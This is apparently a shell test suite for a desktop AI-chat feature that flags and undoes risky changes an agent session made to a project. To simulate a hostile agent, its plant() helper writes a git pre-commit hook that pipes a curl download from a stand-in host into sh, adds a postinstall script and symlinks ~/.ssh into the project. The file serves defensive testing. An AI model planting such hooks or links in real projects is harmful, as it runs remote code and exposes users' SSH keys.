#!/bin/sh
# Tests/48-review-changes.test.sh - the Review Changes window (aichat.review.library.sh): what a
# project snapshot's session changed, flagged entries first; the diff of a file against its
# snapshot copy; undo of one entry and of all; keeping the changes; and the ways in (a chat
# window's line, a history row, a window's close).
#
# The plan's acceptance for Phase 4: a session that plants a git hook, a postinstall script and a
# symbolic link to ~/.ssh gets all three flagged and listed first; undoing one restores one file;
# Undo All restores byte-identical content. The planting is done here, as an agent would.
#
# agent-vm is fake_agent_vm.sh, which hands `session` commands to the real agent-vm in a store
# inside this test's folder (see 48-project-snapshot.test.sh). Without a real agent-vm the file
# checks only the converter.
#
# Needs the sandbox off. POSIX sh only. Validate with "sh -n", never "bash -n".
. "${OMCTEST_LIB:?set OMCTEST_LIB, or run via: appletbuilder test}"
. "$OMCTEST_TESTS/lib.test.cadabra.sh"

LIB=aichat.review.library.sh
FAKE="$OMCTEST_TESTS/helpers/fake_agent_vm.sh"
FIXTURES="$OMCTEST_TESTS/fixtures/agentvm"
FAKE_AGENTVM_DIR="$OMCTEST_WORK/fakevm"
export FAKE_AGENTVM_DIR
REGISTRY="$HOME/Library/Application Support/Cadabra/snapshot-sessions.tsv"
PROJECT="$OMCTEST_WORK/src/app"
PY="$OMC_APP_BUNDLE_PATH/Contents/Library/Python/bin/python3"
CONVERT="$OMC_APP_BUNDLE_PATH/Contents/Resources/Scripts/agentvm_json.py"
TAB=$(printf '\t')
WIN=rv1

unset AGENT_VM_HOME
CADABRA_AGENT_VM="$FAKE"
export CADABRA_AGENT_VM

REAL_AGENT_VM="${CADABRA_TEST_SESSION_AGENT_VM:-}"
if [ -z "$REAL_AGENT_VM" ]; then
    user_home="$(eval "printf '%s' ~$(/usr/bin/id -un)")"
    REAL_AGENT_VM="$user_home/.local/bin/agent-vm"
fi

lib() { cad_call_lib "$LIB" "$@"; }
real() { AGENT_VM_HOME="$FAKE_AGENTVM_DIR/session-store" "$REAL_AGENT_VM" "$@"; }
state() { real session list --json | /usr/bin/jq -r --arg id "$1" '.[] | select(.id == $id) | .state'; }
# table_rows  ->  the review table's rows as the window holds them.
table_rows() { ui_rows 910; }
# row_of <path>  ->  the table row whose path (column 3) is <path>.
row_of() { table_rows | /usr/bin/awk -F'\t' -v p="$1" '$3 == p { print; exit }'; }
# select_row <path>  ->  the selection handler, run as if <path>'s row was clicked.
select_row() {
    selected="$(row_of "$1")"
    OMC_ACTIONUI_TABLE_910_COLUMN_0_VALUE="$selected"
    OMC_ACTIONUI_TABLE_910_COLUMN_3_VALUE="$1"
    OMC_ACTIONUI_TABLE_910_COLUMN_8_VALUE="$(printf '%s\n' "$selected" | /usr/bin/cut -f8)"
    export OMC_ACTIONUI_TABLE_910_COLUMN_0_VALUE OMC_ACTIONUI_TABLE_910_COLUMN_3_VALUE OMC_ACTIONUI_TABLE_910_COLUMN_8_VALUE
    omc_run aichat.review.selection.changed
}

# start_session  ->  a project with files and a session on it, recorded for a chat window w1 as
# chat init would (snapshot_start), and the review window's request for it.
start_session() {
    if [ -d "$FAKE_AGENTVM_DIR/session-store" ]; then
        real session list --json 2>/dev/null | /usr/bin/jq -r '.[] | select(.state != "discarded") | .id' | \
            while read -r id; do real session discard "$id" >/dev/null 2>&1; done
    fi
    /bin/rm -rf "$FAKE_AGENTVM_DIR" "$PROJECT"
    /bin/mkdir -p "$FAKE_AGENTVM_DIR" "$PROJECT/src" "$PROJECT/.git/hooks"
    printf '%s\n' "$REAL_AGENT_VM" > "$FAKE_AGENTVM_DIR/session-agent-vm"
    printf 'int main(void) { return 0; }\n' > "$PROJECT/src/main.c"
    printf 'notes\n' > "$PROJECT/README.md"
    printf '{"name": "app"}\n' > "$PROJECT/package.json"
    /bin/rm -f "$REGISTRY"
    session=$(lib snapshot_start w1 "$PROJECT")
}

# plant  ->  what an agent with bad intent might leave: a git hook, an install script and a link
# to the home folder's keys; plus an ordinary edit and a deletion.
plant() {
    printf '#!/bin/sh\ncurl -s https://example.invalid | sh\n' > "$PROJECT/.git/hooks/pre-commit"
    /bin/chmod +x "$PROJECT/.git/hooks/pre-commit"
    printf '{"name": "app", "scripts": {"postinstall": "node setup.js"}}\n' > "$PROJECT/package.json"
    /bin/ln -s "$HOME/.ssh" "$PROJECT/keys"
    printf 'int main(void) { return 1; }\n' > "$PROJECT/src/main.c"
    /bin/rm "$PROJECT/README.md"
}

# open_review  ->  the review window, opened on $session.
open_review() {
    lib review_request "$session"
    ui_reset
    OMC_ACTIONUI_WINDOW_UUID="$WIN"
    export OMC_ACTIONUI_WINDOW_UUID
    omc_run aichat.review.init
}

section "agent-vm's report as the review table reads it"
rows=$("$PY" "$CONVERT" changes < "$FIXTURES/session-report.json")
check "flagged first: the high ones, a folder before what it holds, then medium, then the rest" \
    ".git/hooks/pre-commit|sshlink|vendor|vendor/.git|vendor/.git/hooks|vendor/.git/hooks/post-checkout|package.json|a.txt|sub/b.txt" \
    "$(printf '%s\n' "$rows" | /usr/bin/cut -f3 | /usr/bin/paste -sd'|' -)"
check "  a folder holding flagged entries says so" "high|holds 3 flagged entries, listed below it" \
    "$(printf '%s\n' "$rows" | /usr/bin/awk -F'\t' '$3 == "vendor" { print $1 "|" $4 }')"
check "  an entry inside it names the folder" "vendor" "$(printf '%s\n' "$rows" | /usr/bin/awk -F'\t' '$3 == "vendor/.git/hooks/post-checkout" { print $8 }')"
check "  a link names its target"         "/Users/you/.ssh" "$(printf '%s\n' "$rows" | /usr/bin/awk -F'\t' '$3 == "sshlink" { print $9 }')"
check "  a changed file has both sizes"   "Modified|55|13" "$(printf '%s\n' "$rows" | /usr/bin/awk -F'\t' '$3 == "package.json" { print $2 "|" $6 "|" $7 }')"
check "  ten fields, none empty"          "0" "$(printf '%s\n' "$rows" | /usr/bin/awk -F'\t' 'NF != 10 { n++; next } { for (i = 1; i <= NF; i++) if ($i == "") n++ } END { print n + 0 }')"
undo='{"restore": {"failed": {"b": "busy"}, "remaining": 2, "restored": ["a"]}, "session": {"state": "active"}}'
check "an undo's answer: restored, remaining, failed, why, state" "1|2|1|b: busy|active" \
    "$(printf '%s\n' "$undo" | "$PY" "$CONVERT" undo | /usr/bin/tr '\t' '|')"

"$REAL_AGENT_VM" --version >/dev/null 2>&1
real_status=$?
if [ "$real_status" -ne 0 ]; then
    section "the window with the real agent-vm: skipped, none at $REAL_AGENT_VM"
    check "(a real agent-vm is needed for the rest of this file)" "skipped" "skipped"
    omctest_end
    exit 0
fi

section "the window lists what the session changed, flagged first"
start_session
plant
open_review
check "the session was taken"             "1" "$(lib agentvm_valid_session_id "$session"; [ $? -eq 0 ] && echo 1)"
# agent-vm names the project with its links resolved (/var is /private/var).
resolved=$(cd "$PROJECT" && /bin/pwd -P)
check "the header: the project, when, the session and its state, the changes" \
    "$resolved|1|$session - in use by a chat window|5, 3 flagged: can run code later on this Mac" \
    "$(ui_value 901)|$(printf '%s\n' "$(ui_value 902)" | /usr/bin/grep -c '^20[0-9][0-9]-[0-9][0-9]-[0-9][0-9] at [0-9][0-9]:[0-9][0-9]$')|$(ui_value 903)|$(ui_value 904)"
check "  the note says to stop the agent first" "1|1" "$(ui_visible 905)|$(cad_has "$(ui_value 905)" "Stop the chat window's agent before undoing a change")"
check "the hook, the link and the install script first" ".git/hooks/pre-commit|keys|package.json" \
    "$(table_rows | /usr/bin/head -3 | /usr/bin/cut -f3 | /usr/bin/paste -sd'|' -)"
# The marks, spelled as bytes so this file stays ASCII: a red circle for high, a yellow one for medium.
RED=$(printf '\360\237\224\264')
YELLOW=$(printf '\360\237\237\241')
check "  marked high, high and medium, the rest unmarked" "$RED|$RED|$YELLOW||" "$(table_rows | /usr/bin/cut -f1 | /usr/bin/paste -sd'|' -)"
check "  the table shows the mark, the change and the path; why stays for the detail pane" '[" ","Change","Path"]' \
    "$(/usr/bin/jq -c '.. | objects | select(.id == 910) | .properties.columns' "$OMC_APP_BUNDLE_PATH/Contents/Resources/Base.lproj/aichat.review.json")"
check "neither Undo All nor Keep while a window uses the session" "0|0" "$(ui_enabled 931)|$(ui_enabled 932)"
check "  the note says so"                "1" "$(cad_has "$(ui_value 905)" 'Undo All and Keep Changes wait until that window is closed')"
failing="$OMCTEST_WORK/failing-agent-vm"
printf '#!/bin/sh\necho "Error: the store is locked" >&2\nexit 1\n' > "$failing"
/bin/chmod +x "$failing"
# Set and put back, not as a prefix: sh keeps a prefix assignment to a function call.
CADABRA_AGENT_VM="$failing"
omc_run aichat.review.refresh
CADABRA_AGENT_VM="$FAKE"
check "sessions that cannot be listed say why, not that the session is gone" "1|0|0|0" \
    "$(cad_has "$(ui_value 905)" 'sessions cannot be listed: the store is locked')|$(cad_has "$(ui_value 905)" 'no longer has')|$(ui_enabled 931)|$(table_rows | /usr/bin/awk 'END { print NR }')"
omc_run aichat.review.refresh
check "  and Refresh shows the changes again once they can" "5" "$(table_rows | /usr/bin/awk 'END { print NR }')"

section "a selected file shows its diff against the snapshot"
select_row src/main.c
check "what it is"                        "Modified: src/main.c" "$(ui_value 920)"
check "  the diff shows, snapshot copy against the project" "1|1|1" \
    "$(ui_visible 923)|$(cad_has "$(ui_prop 922 oldFile)" "/Sessions/$session/snapshot/src/main.c")|$([ "$(ui_prop 922 newFile)" = "$resolved/src/main.c" ] && echo 1)"
check "  and it can be undone"            "1" "$(ui_enabled 930)"
select_row README.md
check "a deleted file: the project side is empty" "1|1" \
    "$(cad_has "$(ui_prop 922 oldFile)" 'snapshot/README.md')|$(cad_has "$(ui_prop 922 newFile)" 'cadabra-review-empty')"
select_row keys
check "a link: its target, no diff"       "1|0" "$(cad_has "$(ui_value 921)" "A symbolic link to $HOME/.ssh")|$(ui_visible 923)"
check "  and why it is flagged"           "1" "$(cad_has "$(ui_value 921)" 'High risk: symlink pointing outside the project')"
# A flag reason that says "inside" itself, on an entry a new folder's change covers (as agent-vm
# words the git folder flag): the reason is kept whole, and only the table's note is dropped.
lib review_detail "$WIN" "High${TAB}Added folder${TAB}vendor/.git${TAB}git folder added: git commands run inside it; inside vendor, undone with it${TAB}directory${TAB}-${TAB}-${TAB}vendor${TAB}-${TAB}high"
check "an entry inside a new folder: its whole reason, the folder named, no undo of its own" "1|0|1|0" \
    "$(cad_has "$(ui_value 921)" 'High risk: git folder added: git commands run inside it')|$(cad_has "$(ui_value 921)" 'undone with it')|$(cad_has "$(ui_value 921)" 'Inside the folder vendor,')|$(ui_enabled 930)"

section "undo one change"
select_row src/main.c
alert_answers_reset
alert_answer 1
omc_run aichat.review.undo.selected
check "Cancel changes nothing"            "int main(void) { return 1; }" "$(/bin/cat "$PROJECT/src/main.c")"
alert_answer 0
alerts_reset
omc_run aichat.review.undo.selected
check "Undo Change puts the file back"    "int main(void) { return 0; }" "$(/bin/cat "$PROJECT/src/main.c")"
check "  after saying a window still works on the project" "1" "$(alerts_mention 'A chat window still works on this project')"
check "  and the list no longer has it"   "" "$(row_of src/main.c)"
check "  the rest are still there"        "4" "$(table_rows | /usr/bin/awk 'END { print NR }')"
cad_journal_reset
omc_run aichat.review.refresh
check "Refresh drops the selection with the detail pane" "1|Select a change to see it.|0" \
    "$(cad_journal 910 | /usr/bin/grep -c '^omc_deselect')|$(ui_value 920)|$(ui_enabled 930)"

section "undo all"
alerts_reset
omc_run aichat.review.undo.all
check "refused while a window uses the session" "1|yes" \
    "$(alerts_mention 'Close it first')|$([ -e "$PROJECT/.git/hooks/pre-commit" ] && echo yes || echo no)"
lib snapshot_release w1
omc_run aichat.review.refresh
check "the window closed: it can be used" "1" "$(ui_enabled 931)"
alert_answer 0
omc_run aichat.review.undo.all
check "the hook, the link and the install script are gone" "no|no|{\"name\": \"app\"}" \
    "$([ -e "$PROJECT/.git/hooks/pre-commit" ] && echo yes || echo no)|$([ -L "$PROJECT/keys" ] && echo yes || echo no)|$(/bin/cat "$PROJECT/package.json")"
check "  the deleted file is back"        "notes" "$(/bin/cat "$PROJECT/README.md")"
check "  the session is undone"           "undone" "$(state "$session")"
check "  and the window says no changes, with no note and nothing left to undo" "None|0|0" "$(ui_value 904)|$(ui_visible 905)|$(ui_enabled 931)"

section "keep the changes"
start_session
printf 'more\n' >> "$PROJECT/README.md"
lib snapshot_release w1
check "the last window gone, the session ended with its changes" "ended" "$(state "$session")"
open_review
check "Keep can be used now"              "1" "$(ui_enabled 932)"
alert_answer 1
omc_run aichat.review.keep
check "Cancel keeps the snapshot"         "ended" "$(state "$session")"
alert_answer 0
omc_run aichat.review.keep
check "Keep Changes deletes the snapshot, the changes stay" "discarded|notes more" \
    "$(state "$session")|$(/bin/cat "$PROJECT/README.md" | /usr/bin/paste -sd' ' -)"

section "the ways in"
start_session
printf 'more\n' >> "$PROJECT/README.md"
cad_pb_set "aichatv2_snapshot_w1" "$session${TAB}0"
OMC_ACTIONUI_WINDOW_UUID=w1
export OMC_ACTIONUI_WINDOW_UUID
chains_reset
omc_run aichat.chat.review
check "Changes... on a chat window asks for the window's session" "1|$session" \
    "$(chain_asked aichat.review)|$(cad_pb_get cadabra_review_request)"
hdir="$HOME/Library/Application Support/Cadabra/History/20260930T000000Z-2"
/bin/mkdir -p "$hdir"
printf '{"id": "20260930T000000Z-2", "snapshots": [{"session": "%s", "project": "%s"}, {"session": "20200101-000000-dead", "project": "%s"}]}\n' "$session" "$PROJECT" "$PROJECT" > "$hdir/meta.json"
cad_pb_set cadabra_review_request ""
OMC_ACTIONUI_TABLE_510_COLUMN_2_VALUE="20260930T000000Z-2"
export OMC_ACTIONUI_TABLE_510_COLUMN_2_VALUE
chains_reset
omc_run aichat.history.review
check "Review Changes on a history row picks the newest snapshot still kept" "1|$session" \
    "$(chain_asked aichat.review)|$(cad_pb_get cadabra_review_request)"
printf '{"id": "20260930T000000Z-2"}\n' > "$hdir/meta.json"
alerts_reset
chains_reset
omc_run aichat.history.review
check "  and for a conversation without one, says so" "0|1" "$(chain_asked aichat.review)|$(alerts_mention 'no project snapshot')"
cad_pb_set aichatv2_session_w1 "20260930T000000Z-2"
printf '{"id": "20260930T000000Z-2"}\n' > "$hdir/meta.json"
lib snapshot_record_meta w1
cad_call_lib aichat.history.library.sh history_review_button w1 "20260930T000000Z-2"
check "the history button can be used for a conversation whose record names a snapshot" "1" "$(ui_enabled 525)"
cad_call_lib aichat.history.library.sh history_review_button w1 ""
check "  and not with no conversation selected" "0" "$(ui_enabled 525)"
# A saved conversation opened from the sidebar in a window whose snapshot was taken before: the
# first message resumes it there, and from then on its changes are in that snapshot too.
printf '{"id": "20260930T000000Z-2"}\n' > "$hdir/meta.json"
cad_pb_set aichatv2_resume_pending_w1 "20260930T000000Z-2"
cad_pb_set aichatv2_snapline_w1 ""
( OMC_ACTIONUI_TRIGGER_CONTEXT='{"sequence":1,"type":"message","id":"m1","data":{"type":"message","message":{"role":"local","text":"hello"}}}'
  export OMC_ACTIONUI_TRIGGER_CONTEXT
  omc_run aichat.chat.entry ) >/dev/null 2>&1
check "  a conversation resumed in a window with a snapshot: its record names it, the button follows" "$session|1" \
    "$(/usr/bin/jq -r '.snapshots[0].session' "$hdir/meta.json")|$(ui_enabled 525)"
cad_pb_set aichatv2_session_w1 ""
cad_journal_reset
lib snapshot_line_show w1
check "a window's own line has the Changes... button" "1" "$(cad_has "$(cad_journal 543)" '"actionID":"aichat.chat.review"')"
cad_pb_set aichatv2_boxline_w1 "b1${TAB}2026-09-30T00:00:00Z${TAB}Kept AgentVM box b1 (stays running)"
/bin/cp "$FIXTURES/box-status-stopped.json" "$FAKE_AGENTVM_DIR/box-b1.json"
cad_journal_reset
lib snapshot_line_show w1
check "  and a box line gets it after its Network... button" "1" "$(cad_has "$(cad_journal 545)" '"actionID":"aichat.chat.review"')"
cad_pb_set aichatv2_boxline_w1 ""

section "closing the last window: a review is offered for high-risk changes"
printf '#!/bin/sh\n' > "$PROJECT/.git/hooks/post-merge"
/bin/chmod +x "$PROJECT/.git/hooks/post-merge"
alerts_reset
alert_answers_reset
alert_answer 0
chains_reset
cad_pb_set cadabra_review_request ""
out=$( ( . "$OMC_APP_BUNDLE_PATH/Contents/Resources/Scripts/$LIB" >/dev/null 2>&1
      snapshot_release w1; review_offer_at_close; printf '%s|%s' "$snapshot_released_session" "$snapshot_released_high" ))
check "the release names the session and its one high-risk change" "$session|1" "$out"
check "  the user is asked"               "1" "$(alerts_mention 'Review the changes in the project?')"
check "  and Review Changes opens the window on it" "1|$session" "$(chain_asked aichat.review)|$(cad_pb_get cadabra_review_request)"
start_session
printf 'more\n' >> "$PROJECT/README.md"
alerts_reset
out=$( ( . "$OMC_APP_BUNDLE_PATH/Contents/Resources/Scripts/$LIB" >/dev/null 2>&1
      snapshot_release w1; review_offer_at_close; printf '%s|%s' "$snapshot_released_session" "$snapshot_released_high" ))
check "changes with no high-risk one: kept, and nobody is asked" "$session|0|0" "$out|$(alerts_count)"
start_session
out=$( ( . "$OMC_APP_BUNDLE_PATH/Contents/Resources/Scripts/$LIB" >/dev/null 2>&1
      snapshot_release w1; printf '%s|%s' "$snapshot_released_session" "$snapshot_released_high" ))
check "no changes: discarded, nothing to offer" "|" "$out"
check "  (the session is gone)"           "discarded" "$(state "$session")"

/bin/rm -rf "$FAKE_AGENTVM_DIR"
omctest_end
